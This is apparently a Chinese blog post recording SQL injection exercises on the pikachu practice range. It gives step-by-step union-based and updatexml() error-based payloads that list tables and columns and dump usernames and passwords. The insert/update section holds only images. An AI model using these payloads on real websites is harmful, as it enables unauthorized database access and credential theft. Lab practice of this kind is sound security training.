---
layout:     post
title:      TimeLineSec安全教程（一）————SQL注入
subtitle:   记录做靶机的过程和过程中的积累
date:       2020-02-24
author:     Ultimater
header-img: img/post-bg-20191109.jpg
catalog: true
tags:
    - 网络安全
    - TimeLine Sec
---

>**感谢 TimeLine Sec 组织的此次基础教程实验，帮助众多安全人员巩固基础和提升技能，尤其对我这样的入门者，更是一个从理论向实践发展的好的契机！同时，MS08067安全实验室出版的《Web安全攻防——渗透测试实验指南》作为我实验过程中用来随时随地加深理论认知的书籍，内容详实清晰，循序渐进，起到了巨大的作用，特此感谢！**

### 一、前言

SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。SQL注入按照不同的分类方法可以分为很多种，如报错注入、盲注、Union联合注入等。

本次 TimeLine Sec 的SQL注入实验靶机为 pikachu ，该靶场涉及到很多漏洞种类，感兴趣的可以自行在本地搭建练习，详情见[Pikachu搭建教程](https://mp.weixin.qq.com/s/z87ddIq79BlwSXNt0cMF2w)

### 二、数字型注入

![20200304212847.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304212847.png)

1.页面抓包之后，在参数`id`处输入`1'`判断是否存在注入

![1.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/1.png)

2.根据`1' and 1=1`和`1' and 1=2`的返回信息判断是数字型注入

![20200304214711.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304214711.png)

![2.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/2.png)

3.`order by 3`判断列数

![3.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/3.png)

4.用union联合注入，`id=-1 union select 1,2`判断输出位置（此时union的前一个条件为假）

![4.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/4.png)

5.union注入获取数据库`id=-1 union select database(),2`

![9O@V5@SSFXIVTWL%`LE}@2Y.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/9O%40V5%40SSFXIVTWL%25%60LE%7D%402Y.png)

6.构造语句爆表名
`id=-1 union select (select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),2`

![20200304215417.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304215417.png)

7.构造语句爆列名
`id=-1 union select (select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 1,1),2`

![A400U3PIJ6975{7C53L3Q18.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/A400U3PIJ6975%7B7C53L3Q18.png)

8.获取用户名
`id=-1 union select (select group_concat(username) from pikachu.users),2`

![20200304215626.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304215626.png)

9.获取用户密码`id=-1 union select (select group_concat(password) from pikachu.users),2`

![5.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/5.png)

### 三、字符型注入

1.输入`1'`报错，输入`1'#`页面返回正常，可判断为字符型注入

![6.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/6.png)

![QQ图片20200305113343.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113343.png)

2.判断列数`1' order by 3#`

![QQ图片20200305113549.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113549.png)

3.查看union注入返回到页面的位置`-1' union select 1,2#`

![7.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/7.png)

4.爆库名`-1' union select database(),2#`

![QQ图片20200305113621.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113621.png)

5.爆表名`-1' union select (select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),2#`

![LTIEN1IOOH%PH}3MZS~%XXP.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/LTIEN1IOOH%25PH%7D3MZS%7E%25XXP.png)

6.爆user表中的列名`-1' union select (select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),2#`

![QQ图片20200305105055.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305105055.png)

7.爆user表的username字段`-1' union select (select group_concat(username) from pikachu.users),2#`

![QQ图片20200305105434.jpg](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305105434.jpg)

8.爆user表中的password字段`-1' union select (select group_concat(password) from pikachu.users),2#`

![QQ图片20200305113649.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113649.png)

### 四、搜索型注入

>**查看Pikachu的后台源码，发现搜索型注入和字符型注入的差别在于输入参数的闭合方式，字符型为`'name'`,搜索型为`'%name%'`,不过在注入过程中发现其payload构造方式与字符型相同，因为在构造时加入`1'`闭合前面的单引号之后，引号内部的 % 也被闭合掉了，所以不会产生影响。**

1.输入`1'`报错，输入`1'#`返回正常

![D$ZI5R3%C332N9~9.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/D%24ZI5)%7B)R3%25%7DC332N%7D9%7D%7D%7E9.png)

![WSNH81ZS7$76QTW9VMJU.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/WSNH81ZS7%247%7B6QT(W9V(MJU.png)

2.用 order by 判断列数`1' order by 4#`

![HMUGZFQTHL9QA$]H@IZE4C.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/HMUGZ(FQTHL9QA%24%5DH%40IZE4C.png)

3.union看回显`-1' union select 1,2,3#`

![BTF_4TN87CJHCWC71Y65S.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/BTF_4TN87CJHCWC%7B71(Y65S.png)

4.爆库名`-1' union select 1,database(),3#`

![QQ图片20200305124300.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124300.png)

5.爆表名`-1' union select 1,(select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),3#`

![QQ图片20200305124400.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124400.png)

6.爆列名`-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),3#`

![_HS%PDJMGKG8MAKRQ`D4.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/_HS%25PDJM%7DGKG8MAKR%7DQ%60)D4.png)

7.查看username字段`-1' union select 1,(select group_concat(username) from pikachu.users),3#`

![QQ图片20200305124544.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124544.png)

8.查看password字段`-1' union select 1,(select group_concat(password) from pikachu.users),3#`

![QQ图片20200305124710.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124710.png)

### 五、xx型注入

>**xx型注入的后台源码显示闭合方式为`('name')`,用union注入方法和之前的字符型注入、搜索型注入原理相通，只是在闭合的地方用`')`进行闭合就可以了。为加深对报错注入的理解，所以此处改用报错注入的方法来做**

1.输入`1')`报错，输入`1')#`返回正常

![ZLYA9ZY4W$PZ8AY$8ML5XE.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ZLYA9Z)Y4W%24PZ8AY%248ML5XE.png)

![QQ图片20200305125820.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305125820.png)

2.用`updatexml()`函数进行数据库报错:`1') and updatexml(1,concat(0x7e,database(),0x7e),1)#`

![QQ图片20200305125948.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305125948.png)

3.爆表`-1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),0x7e),1)#`

![QQ图片20200305130122.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305130122.png)

4.爆列名`-1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),0x7e),1)#`

![KXM4JDV@Q7CWL]Q%EEF.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/KXM(4JDV%7D%40Q%7B%7D7CWL%5DQ%25EEF.png)

5.爆字段`-1') and updatexml(1,concat(0x7e,(select group_concat(username) from pikachu.users),0x7e),1)#`

![QQ图片20200305130352.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305130352.png)

### 六、insert/update注入

![khbsvvskdbvlbv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/khbsvvskdbvlbv)

![sjvdhkad](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sjvdhkad)







































































